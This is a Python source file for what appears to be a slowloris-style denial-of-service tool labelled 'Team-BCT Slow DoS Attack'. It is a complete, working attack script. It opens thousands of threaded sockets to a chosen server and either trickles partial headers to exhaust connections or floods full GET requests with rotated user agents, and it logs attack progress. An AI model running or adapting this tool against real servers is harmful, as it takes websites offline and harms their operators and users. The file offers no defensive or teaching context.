import socket
import time
import threading
import random
import argparse
import requests
from termcolor import colored
import colorama
import re
import sys

colorama.init()

currentVersionNumber = "v3.2.0"
VERSION_CHECK_URL = "https://raw.githubusercontent.com/jundulkafa/bctslowloris/main/versionfile.txt"  # Changed to raw URL
BANNER1 = colored('''
   ▄████ ▓█████▄▄▄█████▓ ██▀███  ▓█████   █████  ▄▄▄█████▓
  ██▒ ▀█▒▓█   ▀▓  ██▒ ▓▒▓██ ▒ ██▒▓█   ▀ ▒██▓  ██▒▓  ██▒ ▓▒
 ▒██░▄▄▄░▒███  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒███   ▒██▒  ██░▒ ▓██░ ▒░
 ░▓█  ██▓▒▓█  ▄░ ▓██▓ ░ ▒██▀▀█▄  ▒▓█  ▄ ░██  █▀ ░░ ▓██▓ ░
 ░▒▓███▀▒░▒████▒ ▒██▒ ░ ░██▓ ▒██▒░▒████▒░▒███▒█▄   ▒██▒ ░
  ░▒   ▒ ░░ ▒░ ░ ▒ ░░   ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒▒░ ▒   ▒ ░░
   ░   ░  ░ ░  ░   ░      ░▒ ░ ▒░ ░ ░  ░ ░ ▒░  ░     ░
 ░ ░   ░    ░    ░        ░░   ░    ░      ░   ░   ░''', 'blue')
BANNER2 = colored('''    ------------------------------------------------''', 'blue')
BANNER3 = colored('''    || Team-BCT- Slow DoS Attack ||''', 'red')
BANNER4 = colored('''    ------------------------------------------------''', 'blue')


def printBanner():
    print(BANNER1)
    print(BANNER2)
    print(BANNER3)
    print(BANNER4)


def versionCheck():
    global currentVersionNumber
    print("\nChecking for GETreqt updates...", end="")
    
    try:
        crawlVersionFile = requests.get(VERSION_CHECK_URL, timeout=10)
        crawlVersionFile.raise_for_status()
        version_content = crawlVersionFile.text.strip()
        latestVersionNumber = int(''.join(re.findall(r"([0-9]+)", version_content)))
        
        current_version_num = int(''.join(re.findall(r"([0-9]+)", currentVersionNumber)))
        
        if current_version_num >= latestVersionNumber:
            print(colored(" You are using TEAM-BCT version!\n", "green"))
        else:
            print(colored(" You are using an older version of GETreqt.", "red"))
            print(colored("\nGet the latest version at https://github.com/jundulkafa/bctslowloris ", "yellow"))
            print(colored("Every new version comes with fixes, improvements, new features, etc..", "yellow"))
            print(colored("Please do not open an Issue if you see this message and have not yet tried the latest version.\n", "yellow"))
    except Exception as e:
        print(colored(f" Failed to check version: {e}", "red"))


randomUserAgent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Edg/87.0.664.57",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
]
successfulSends = 0
active_connections = 0
lock = threading.Lock()


def constructRequest():
    # Use HTTP/1.1 instead of HTTP/2.0
    requestHeaders = ["GET / HTTP/1.1",
                      f"Host: {target}",
                      "Connection: keep-alive",
                      f"User-Agent: {random.choice(randomUserAgent)}",
                      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                      "Accept-Language: en-US,en;q=0.5",
                      "Accept-Encoding: gzip, deflate",
                      "\r\n"]
    GETrequest = "\r\n".join(requestHeaders).encode("utf-8")
    return GETrequest


def create_socket():
    """Create and return a new socket with appropriate settings"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    return sock


def deployRequests(target, port, length, currentSocket, GETrequest):
    global successfulSends, active_connections
    
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            sock = create_socket()
            sock.connect((target, port))
            
            with lock:
                active_connections += 1
                
            # Send initial request
            sock.send(GETrequest)
            
            if arguments.end:
                # For end mode, send multiple complete requests
                for i in range(length):
                    try:
                        sock.send(GETrequest)
                        with lock:
                            successfulSends += 1
                        print(f"Successful send #{successfulSends} from socket {currentSocket}")
                        time.sleep(random.random() * 5)
                    except:
                        break
            else:
                # For wait mode, keep connection open and send partial data
                for i in range(length):
                    try:
                        # Send keep-alive headers or partial data
                        sock.send(b"X-a: b\r\n")
                        print(f"Sent keep-alive packet {i+1}/{length} via socket {currentSocket}")
                        time.sleep(random.random() * 5)
                    except:
                        break
            
            # Clean up
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except:
                pass
                
            with lock:
                active_connections -= 1
                
            break  # Success, break out of retry loop
            
        except Exception as e:
            retry_count += 1
            print(f"Socket {currentSocket} connection failed (attempt {retry_count}/{max_retries}): {e}")
            try:
                sock.close()
            except:
                pass
            time.sleep(2)  # Wait before retrying


def attackThreads(target, port, length, sockets, GETrequest):
    threads = []
    print(f"\nCreating {sockets} sockets to attack {target} via port {port}")
    
    for currentSocket in range(sockets):
        thread = threading.Thread(
            target=deployRequests, 
            args=[target, port, length, currentSocket, GETrequest],
            daemon=True
        )
        threads.append(thread)
        thread.start()
        time.sleep(0.01)  # Small delay to avoid overwhelming the system
    
    # Monitor threads
    try:
        while any(thread.is_alive() for thread in threads):
            time.sleep(1)
            with lock:
                print(f"Active connections: {active_connections}, Successful sends: {successfulSends}")
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    
    print("\nAttack completed or interrupted.")


if __name__ == "__main__":
    printBanner()
    versionCheck()

    cli = argparse.ArgumentParser()
    cliExclusive = cli.add_mutually_exclusive_group()

    cli.add_argument("-x", "--target", required=True, help="Target web server address (IP addess or URL)")
    cli.add_argument("-p", "--port", required=True, type=int, help="Target web server port (eg: 80)")
    cli.add_argument("-l", "--length", required=True, type=int, help="Total packet length (eg: 1000)")
    cli.add_argument("-t", "--threads", required=True, type=int, help="Threads (sockets) to attack with (eg: 6000)")
    cliExclusive.add_argument("-w", "--wait", help="Do not terminate requests (elegant slow DoS)", action="store_true")
    cliExclusive.add_argument("-e", "--end", help="Terminate all requests correctly (blatant GET spam)", action="store_true")

    arguments = cli.parse_args()

    target = arguments.target
    port = arguments.port
    length = arguments.length
    sockets = arguments.threads

    # Validate inputs
    if sockets <= 0 or length <= 0 or port <= 0:
        print("Error: threads, length, and port must be positive integers")
        sys.exit(1)
        
    if sockets > 10000:
        print("Warning: Using more than 10,000 threads may cause system instability")

    GETrequest = constructRequest()
    
    try:
        attackThreads(target, port, length, sockets, GETrequest)
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"Error: {e}")
